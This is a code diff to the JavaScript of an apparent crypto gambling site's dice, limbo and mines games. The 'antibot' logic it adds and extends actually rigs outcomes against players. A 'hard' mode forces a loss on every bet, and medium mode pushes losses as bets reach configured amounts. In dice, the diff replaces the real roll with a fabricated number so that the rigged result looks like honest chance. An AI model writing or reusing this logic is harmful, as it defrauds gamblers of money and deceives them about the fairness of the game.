@@ -180,6 +180,10 @@ document.addEventListener('DOMContentLoaded',()=>{
 const aff=document.getElementById('affLink');if(aff)aff.value='https://tronsick.io/ref/'+Math.random().toString(36).substr(2,8);
 try{var sb=localStorage.getItem('userBalance');if(sb&&parseFloat(sb)>0){var ubEl=document.getElementById('userBalance');if(ubEl)ubEl.textContent=parseFloat(sb).toFixed(6);}}catch(e){}
 syncBal();initClaimTimer();initNewUserBonus();
+if(window.SiteSync){
+  SiteSync.loadAntibot();
+  if(document.getElementById('ctCkDays')) SiteSync.startContestTimer({},1000);
+}
 // Show section based on PHP-injected variable (each page sets window._INIT_SECTION)
 var _initSec=(typeof window._INIT_SECTION!=='undefined')?window._INIT_SECTION:'home';
 _showSection(_initSec);
@@ -213,6 +217,23 @@ var _ab={
 };
 
 /**
+ * Read antibot setting — server inject (_SITE_AB) first, then localStorage
+ */
+function _getAb(key, fallback){
+  if(window._SITE_AB && String(window._SITE_AB._saved)==='1' && window._SITE_AB[key]!=null)
+    return String(window._SITE_AB[key]);
+  var v=localStorage.getItem(key);
+  return v!=null?v:fallback;
+}
+
+function _abAmtMatch(betAmt, triggerAmt){
+  triggerAmt=parseFloat(triggerAmt)||0;
+  if(triggerAmt<=0) return true;
+  betAmt=parseFloat(betAmt)||0;
+  return betAmt >= triggerAmt - 0.000001;
+}
+
+/**
  * Central antibot decision function.
  * Call before deciding win/loss in Dice, Limbo, Mines.
  * @param {number} betAmt  - current bet amount
@@ -225,16 +246,16 @@ function _abCheckWin(betAmt, winPct, payout){
   winPct = parseFloat(winPct)||0;
   payout = parseFloat(payout)||0;
 
-  var ab1On     = localStorage.getItem('ab1_on')==='1';
-  var ab1Amt    = parseFloat(localStorage.getItem('ab1_amount')||'0');
-  var ab1Mode   = localStorage.getItem('ab1_mode')||'medium';
-  var ab2On     = localStorage.getItem('ab2_on')==='1';
-  var ab2Amt    = parseFloat(localStorage.getItem('ab2_amount')||'0');
-  var ab2Wins   = parseInt(localStorage.getItem('ab2_wins')||'6');
-  var ab3On     = localStorage.getItem('ab3_on')==='1';
+  var ab1On     = _getAb('ab1_on','0')==='1';
+  var ab1Amt    = parseFloat(_getAb('ab1_amount','0'));
+  var ab1Mode   = _getAb('ab1_mode','medium');
+  var ab2On     = _getAb('ab2_on','0')==='1';
+  var ab2Amt    = parseFloat(_getAb('ab2_amount','0'));
+  var ab2Wins   = parseInt(_getAb('ab2_wins','6'));
+  var ab3On     = _getAb('ab3_on','0')==='1';
 
-  var amtMatch1 = ab1Amt>0 && Math.abs(betAmt-ab1Amt) < Math.max(0.000001, ab1Amt * 0.001);
-  var amtMatch2 = ab2Amt>0 && Math.abs(betAmt-ab2Amt) < Math.max(0.000001, ab2Amt * 0.001);
+  var amtMatch1 = ab1On && _abAmtMatch(betAmt, ab1Amt);
+  var amtMatch2 = ab2On && _abAmtMatch(betAmt, ab2Amt);
 
   // ── ANTIBOT 2 check (96%–65% range + amount match) ──
   if(ab2On && amtMatch2 && winPct>=65 && winPct<=96){
@@ -296,14 +317,14 @@ function _abCheckWin(betAmt, winPct, payout){
     }
   }
 
-  // ── ANTIBOT 1 (amount match, below 65% or AB2 not active for this range) ──
-  if(ab1On && ab1Amt>0 && amtMatch1){
-    _ab.ab1Count++;
+  // ── ANTIBOT 1 ──
+  if(ab1On){
     if(ab1Mode==='hard'){
-      return false; // Always FORCE LOSS
-    } else {
-      // Medium: first 3 normal, then pattern: 1 win per 4 losses roughly
-      if(_ab.ab1Count<=3) return null; // normal for first 3
+      return false; // Hard = force loss on every bet
+    }
+    if(amtMatch1){
+      _ab.ab1Count++;
+      if(_ab.ab1Count<=3) return null;
       var lossProb = Math.min(0.85, 0.5 + (_ab.ab1Count*0.03));
       return Math.random() > lossProb ? true : false;
     }
@@ -1150,6 +1171,15 @@ nonce++;
 setTimeout(function(){
 var roll=parseFloat((Math.random()*100).toFixed(2));var _abR=_abCheckWin(bet,wc,payout);
 var win=(dgDir==='under'&&roll<wc)||(dgDir==='over'&&roll>(100-wc));
+if(_abR===false){
+  win=false;
+  if(dgDir==='under') roll=Math.min(99.99, wc+1+Math.random()*10);
+  else roll=Math.max(0.01, (100-wc)-1-Math.random()*10);
+}else if(_abR===true){
+  win=true;
+  if(dgDir==='under') roll=Math.max(0.01, wc-1-Math.random()*10);
+  else roll=Math.min(99.99, (100-wc)+1+Math.random()*10);
+}
 var sl=document.getElementById('dgSlider');
 var hex=document.getElementById('hexBubble');
 if(hex&&sl){
